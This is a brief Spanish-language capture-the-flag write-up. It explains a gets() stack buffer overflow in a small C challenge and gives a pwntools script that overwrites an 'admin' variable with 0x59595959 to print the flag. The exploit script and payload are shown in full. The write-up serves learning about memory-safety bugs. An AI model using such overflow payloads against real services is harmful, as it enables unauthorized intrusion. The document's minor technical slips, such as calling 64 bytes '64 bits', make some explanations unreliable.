Analisis del codigo fuente

En la funcion main() define un bufer de 64 bits y luego toma nuestro output utilizando la funcion gets(), como sabemos esta funcion es insegura y no se recomienda su uso por que no limita el numero de caracteres que lee, lo que en la mayoria de veces produce desbordamientos de bufer.

char buf[64];
puts("Please Go ahead and leave a comment :");
gets(buf);

Luego define un condicional if que comprueba si la variable admin tiene la direccion de memoeria 0x59595959, si esto es así nos muestra la flag.

if (admin==0x59595959){
    read_flag();
}

La funcion read_flag() se encarga de abrir un archivo flag.txt y mostrarlo por pantalla. Para resolver este desafio debemos explotar una vulnerabilidad de Buffer Overflow y asignarle el valor 0x59595959 a la variable admin para leer la flag.

Solucion

Para resolver el desafio vamos a llenar el Bufer y enviar el valor 0x59595959 para obtener la flag, con el siguiente script resolvemos el desafio.

from pwn import *

def get_process():
    if len(sys.argv) != 2:
        print('Usage: python3 script.py <ip:port>')
        exit(1)
    host, port = sys.argv[1].split(':')
    return remote(host, int(port))

def main():
    payload = b'A' * 72 + p32(0x59595959) *2

    r = get_process()

    r.sendlineafter(b'Please go ahead and leave a comment :\n', payload)

    print(r.recv())

if __name__ == '__main__':
    main()

Recomiendo leer sobre stack alignment para enteder por que se enviaron 72 bytes en ves de 64 y se mutliplico la direccion de memoria por dos
